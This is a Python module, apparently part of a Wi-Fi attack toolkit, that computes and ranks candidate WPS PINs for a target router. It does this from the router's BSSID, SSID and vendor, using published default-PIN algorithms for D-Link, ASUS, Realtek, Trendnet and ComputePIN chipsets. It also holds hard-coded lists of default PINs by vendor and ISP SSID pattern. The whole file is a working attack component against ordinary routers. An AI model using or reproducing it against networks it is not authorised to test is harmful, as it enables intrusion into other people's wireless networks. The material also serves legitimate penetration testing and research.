from __future__ import annotations

import re
from typing import Callable, List, Optional, Tuple

from wifit3.dot11.wsc.crypto import pin_checksum

Generator = Callable[[bytes], List[str]]


def _finalize(raw: int) -> str:
    seven = raw % 10_000_000
    return f"{seven:07d}{pin_checksum(seven)}"


# --- ComputePIN (Broadcom / Atheros / Ralink reference firmwares) -------------
# Citation: Stefan Viehböck (2011), "Brute forcing Wi-Fi Protected Setup".
# Implementation: Zhao Chunsheng (ComputePIN).
def pin24(bssid: bytes) -> List[str]:
    nic = int.from_bytes(bssid[3:], "big")
    return [_finalize(nic)]


def pin_computepin_28(bssid: bytes) -> List[str]:
    raw = int.from_bytes(bssid[2:], "big") & 0x0FFFFFFF
    return [_finalize(raw)]


def pin_computepin_32(bssid: bytes) -> List[str]:
    raw = int.from_bytes(bssid[2:], "big")
    return [_finalize(raw)]


# --- Airocon / Realtek (RTL8186 / RTL8196 family) ----------------------------
# Citation: 3WiFi (stascorp.com/wpspin).
def pin_airocon(bssid: bytes) -> List[str]:
    b = bssid
    raw = (((b[0] + b[1]) % 10)
           + ((b[5] + b[0]) % 10) * 10
           + ((b[4] + b[5]) % 10) * 100
           + ((b[3] + b[4]) % 10) * 1000
           + ((b[2] + b[3]) % 10) * 10000
           + ((b[1] + b[2]) % 10) * 100000
           + ((b[0] + b[1]) % 10) * 1000000)
    return [_finalize(raw)]


# --- D-Link (DIR-615, DIR-645, etc.) -----------------------------------------
# Citation: Craig Heffner / devttys0 (2014), "From China, with Love".
def _dlink_raw(nic: int) -> int:
    pin = nic ^ 0x55AA55
    pin ^= (((pin & 0x0F) << 4) + ((pin & 0x0F) << 8) + ((pin & 0x0F) << 12)
            + ((pin & 0x0F) << 16) + ((pin & 0x0F) << 20))
    pin %= 10_000_000
    if pin < 1_000_000:
        pin += (pin % 9) * 1_000_000 + 1_000_000
    return pin


def pin_dlink(bssid: bytes) -> List[str]:
    nic = int.from_bytes(bssid[3:], "big")
    return [_finalize(_dlink_raw(nic))]


def pin_dlink1(bssid: bytes) -> List[str]:
    nic = (int.from_bytes(bssid[3:], "big") + 1) & 0xFFFFFF
    return [_finalize(_dlink_raw(nic))]


# --- ASUS (RT series routers) ------------------------------------------------
# Citation: 3WiFi (stascorp.com/wpspin).
def pin_asus(bssid: bytes) -> List[str]:
    b = bssid
    s = sum(b[1:])
    digits = "".join(str((b[i % 6] + b[5]) % (10 - (i + s) % 7)) for i in range(7))
    return [_finalize(int(digits))]


# --- Inverted NIC ------------------------------------------------------------
# Citation: 3WiFi (stascorp.com/wpspin).
def pin_invnic(bssid: bytes) -> List[str]:
    nic = int.from_bytes(bssid[3:], "big") ^ 0xFFFFFF
    return [_finalize(nic)]


# --- Trendnet (TEW series) ---------------------------------------------------
# Citation: 3WiFi (stascorp.com/wpspin).
def pin_trendnet(bssid: bytes) -> List[str]:
    b = bssid
    raw = b[3] * 10000 + b[4] * 100 + b[5]
    return [_finalize(raw)]


ALGO_DISPATCH: dict[str, Generator] = {
    "zhao": pin24,
    "computepin_28": pin_computepin_28,
    "computepin_32": pin_computepin_32,
    "dlink": pin_dlink,
    "dlink1": pin_dlink1,
    "asus": pin_asus,
    "airocon": pin_airocon,
    "trendnet": pin_trendnet,
    "invnic": pin_invnic,
}

_HEX_CHARS = "0123456789abcdefABCDEF"

VENDOR_FALLBACK_PINS: Tuple[Tuple[re.Pattern, Tuple[str, ...]], ...] = (
    (re.compile(r"\bcomtrend\b", re.I), ("18811728", "20172527", "18836486", "49385052", "12715657")),
    (re.compile(r"\badb\b", re.I), ("16538061", "88202907", "13409708", "47148826", "77828491")),
    (re.compile(r"\bnetgear\b", re.I), ("12345670", "37380342", "42375852", "30022645", "49945386")),
    (re.compile(r"\bd-?link\b", re.I), ("46264848", "20172527", "21464065", "68175542", "76229909")),
    (re.compile(r"\bbelkin|arcadyan\b", re.I), ("12885381", "25751118", "14989346", "53704825", "40770765")),
    (re.compile(r"\btp-?link\b", re.I), ("12345678", "61116597", "11997870", "41236079", "54080812")),
    (re.compile(r"\bhuawei\b", re.I), ("12345670", "25905892", "12345678", "85275560", "24684323")),
    (re.compile(r"\baskey\b", re.I), ("12345670", "20859978", "51327330", "23659391")),
    (re.compile(r"\bzyxel\b", re.I), ("11866428", "38163289", "15843128", "66202240")),
    (re.compile(r"\blinksys|cisco\b", re.I), ("70066647", "66026402", "04387411", "13317249")),
    (re.compile(r"\bthomson|technicolor\b", re.I), ("67958146", "59762454", "74673841", "83712630")),
    (re.compile(r"\bedimax\b", re.I), ("35611530", "58227046", "85521162")),
    (re.compile(r"\bupvel\b", re.I), ("20854836", "43977680", "05294176")),
    (re.compile(r"\btenda\b", re.I), ("40881768", "28818885", "01756401")),
)

SSID_PATTERN_PINS: Tuple[Tuple[re.Pattern, Tuple[str, ...]], ...] = (
    (re.compile(r"^WLAN_[0-9A-Fa-f]{4}$"), ("12345670", "11866428", "18836486", "88478760")),
    (re.compile(r"^JAZZTEL_[0-9A-Fa-f]{2,4}$", re.I), ("20329761", "12345670")),
    (re.compile(r"^MOVISTAR_[0-9A-Fa-f]{4}$", re.I), ("12345670", "71537573")),
    (re.compile(r"^Dlink_[0-9A-Fa-f]{4}$", re.I), ("20172527", "21464065")),
    (re.compile(r"^Vodafone[0-9A-Fa-f]{4}$", re.I), ("71537573", "12345670")),
    (re.compile(r"^Orange-[0-9A-Fa-f]{4}$", re.I), ("12345670",)),
)


def pins_for(
    bssid: bytes | str,
    ssid: Optional[str] = None,
    vendor: Optional[str] = None,
    model: Optional[str] = None,
) -> List[str]:
    """Ranked, deduplicated candidate WPS PINs for a target context."""
    if isinstance(bssid, str):
        hexstr = "".join(c for c in bssid if c in _HEX_CHARS)[:12]
        if len(hexstr) < 12:
            return []
        b = bytes.fromhex(hexstr)
    else:
        b = bssid

    from .wps_pindb import MODEL_PINS, OUI_ALGOS, OUI_PINS
    from wifit3.wlan.fingerprint_vendors import VENDOR_BY_OUI

    oui = b[:3].hex().upper()
    out: List[str] = []

    # Tier 1: Make / Model exact match
    if model and model in MODEL_PINS:
        out.extend(MODEL_PINS[model])

    # Tier 2: OUI exact match (airgeddon + Default-WPS-PINs)
    if oui in OUI_PINS:
        out.extend(OUI_PINS[oui])

    # Tier 3: OUI-specific algorithm
    for algo_name in OUI_ALGOS.get(oui, ()):
        func = ALGO_DISPATCH.get(algo_name)
        if func:
            out.extend(func(b))

    # Tier 4: SSID pattern match
    if ssid:
        for pattern, pattern_pins in SSID_PATTERN_PINS:
            if pattern.search(ssid):
                out.extend(pattern_pins)

    # Tier 5: Vendor-specific algorithm & fallbacks
    resolved_vendor = vendor or VENDOR_BY_OUI.get(oui) or ""
    low_vendor = resolved_vendor.lower()
    if "dlink" in low_vendor or "d-link" in low_vendor:
        out.extend(pin_dlink(b))
        out.extend(pin_dlink1(b))
    elif "asus" in low_vendor:
        out.extend(pin_asus(b))

    for pattern, fallback_pins in VENDOR_FALLBACK_PINS:
        if pattern.search(resolved_vendor):
            out.extend(fallback_pins)

    # Tier 6: Broad chipset algorithms
    out.extend(pin24(b))
    out.extend(pin_airocon(b))

    return list(dict.fromkeys(out))
